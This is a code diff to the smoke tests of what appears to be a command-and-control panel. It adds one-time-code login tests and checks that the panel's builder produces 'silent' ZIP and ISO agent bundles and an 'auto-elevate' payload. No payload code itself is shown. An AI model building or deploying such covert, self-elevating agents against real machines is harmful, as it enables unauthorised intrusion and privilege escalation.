@@ -24,6 +24,39 @@ const PORT = Number(process.env.SMOKE_PORT || 3222);
 const BASE = `http://127.0.0.1:${PORT}`;
 const ADMIN_USER = 'smokeadmin';
 const ADMIN_PASS = 'smokepass-' + Math.random().toString(36).slice(2);
+const TOTP_SECRET = 'JBSWY3DPEHPK3PXPJBSWY3DPEHPK3PXP';
+
+// RFC 6238 TOTP (SHA1, 6 digits, 30s) — mirrors the server implementation.
+function totpCode(secretB32, drift = 0) {
+  const B32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+  const clean = secretB32.toUpperCase().replace(/[^A-Z2-7]/g, '');
+  let bits = 0, value = 0;
+  const key = [];
+  for (const ch of clean) {
+    value = (value << 5) | B32.indexOf(ch);
+    bits += 5;
+    if (bits >= 8) { key.push((value >>> (bits - 8)) & 0xFF); bits -= 8; }
+  }
+  const counter = Math.floor(Date.now() / 30000) + drift;
+  const buf = Buffer.alloc(8);
+  buf.writeUInt32BE(Math.floor(counter / 0x100000000), 0);
+  buf.writeUInt32BE(counter >>> 0, 4);
+  const crypto = require('node:crypto');
+  const h = crypto.createHmac('sha1', Buffer.from(key)).update(buf).digest();
+  const off = h[h.length - 1] & 0xF;
+  const code = ((h[off] & 0x7F) << 24 | h[off + 1] << 16 | h[off + 2] << 8 | h[off + 3]) % 1000000;
+  return String(code).padStart(6, '0');
+}
+
+async function login() {
+  const step1 = await api('POST', '/api/auth/login', { username: ADMIN_USER, password: ADMIN_PASS });
+  if (!step1.json?.totp_required && !step1.json?.totp_setup) return { token: null, step1 };
+  const step2 = await api('POST', '/api/auth/totp', {
+    ticket: step1.json.ticket,
+    code: totpCode(TOTP_SECRET),
+  });
+  return { token: step2.json?.token || null, step1, step2 };
+}
 
 let passed = 0;
 let failed = 0;
@@ -82,6 +115,7 @@ async function main() {
       JWT_SECRET: 'smoke-secret',
       ADMIN_USER,
       ADMIN_PASS,
+      TOTP_SECRET,
       PYTHON_BIN: 'python',
     },
     stdio: ['ignore', 'pipe', 'pipe'],
@@ -98,12 +132,18 @@ async function main() {
     section('BOOT');
     ok('server health 200', await waitForHealth());
 
-    section('AUTH');
+    section('AUTH + TOTP');
     const badLogin = await api('POST', '/api/auth/login', { username: ADMIN_USER, password: 'wrong' });
     ok('bad password rejected 401', badLogin.status === 401);
-    const login = await api('POST', '/api/auth/login', { username: ADMIN_USER, password: ADMIN_PASS });
-    ok('login 200', login.status === 200 && login.json?.token);
-    const token = login.json?.token;
+    const step1 = await api('POST', '/api/auth/login', { username: ADMIN_USER, password: ADMIN_PASS });
+    ok('password step returns totp_required', step1.status === 200 && step1.json?.totp_required === true && !!step1.json?.ticket);
+    const badTotp = await api('POST', '/api/auth/totp', { ticket: step1.json.ticket, code: '000000' });
+    ok('wrong TOTP code rejected 401', badTotp.status === 401);
+    const step2 = await api('POST', '/api/auth/totp', { ticket: step1.json.ticket, code: totpCode(TOTP_SECRET) });
+    ok('TOTP login issues token', step2.status === 200 && !!step2.json?.token);
+    const token = step2.json?.token;
+    const staleTotp = await api('POST', '/api/auth/totp', { ticket: step1.json.ticket, code: totpCode(TOTP_SECRET, 1) });
+    ok('used ticket cannot be replayed', staleTotp.status === 401);
     const me = await api('GET', '/api/auth/me', undefined, token);
     ok('me returns admin', me.json?.user?.role === 'admin');
     const noAuth = await api('GET', '/api/sessions');
@@ -127,6 +167,28 @@ async function main() {
 
     const cppBuild = await api('POST', '/api/builders/build', { name: 'smoke_cpp', agent_type: 'cpp' }, token);
     ok('cpp build recorded (queued)', cppBuild.status === 200 && cppBuild.json?.status === 'queued');
+
+    section('SILENT BUNDLES');
+    const zipBuild = await api('POST', '/api/builders/build', {
+      name: 'smoke_bundle_zip', agent_type: 'python', bundle: 'zip', modules: 'core',
+    }, token);
+    ok('zip bundle built', zipBuild.status === 200 && zipBuild.json?.filename?.endsWith('.zip'), zipBuild.json?.filename);
+    if (zipBuild.json?.path && fs.existsSync(zipBuild.json.path)) {
+      const head = fs.readFileSync(zipBuild.json.path).subarray(0, 2).toString();
+      ok('zip has PK signature', head === 'PK');
+    }
+    const isoBuild = await api('POST', '/api/builders/build', {
+      name: 'smoke_bundle_iso', agent_type: 'python', bundle: 'iso', modules: 'core',
+    }, token);
+    ok('iso bundle built', isoBuild.status === 200 && isoBuild.json?.filename?.endsWith('.iso'), isoBuild.json?.filename + ' / ' + (isoBuild.json?.error || ''));
+    if (isoBuild.json?.path && fs.existsSync(isoBuild.json.path)) {
+      const isoBuf = fs.readFileSync(isoBuild.json.path);
+      ok('iso has CD001 PVD signature', isoBuf.subarray(0x8001, 0x8006).toString() === 'CD001');
+    }
+    const autoEsc = await api('POST', '/api/builders/build', {
+      name: 'smoke_autoesc', agent_type: 'python', auto_elevate: true, modules: 'core,autoesc',
+    }, token);
+    ok('auto-elevate payload compiles', autoEsc.status === 200 && await pyCompile(autoEsc.json.path));
 
     section('TASK-PROTOCOL AGENT LOOP');
     const sessionId = 'smoketask' + Math.random().toString(36).slice(2, 6);
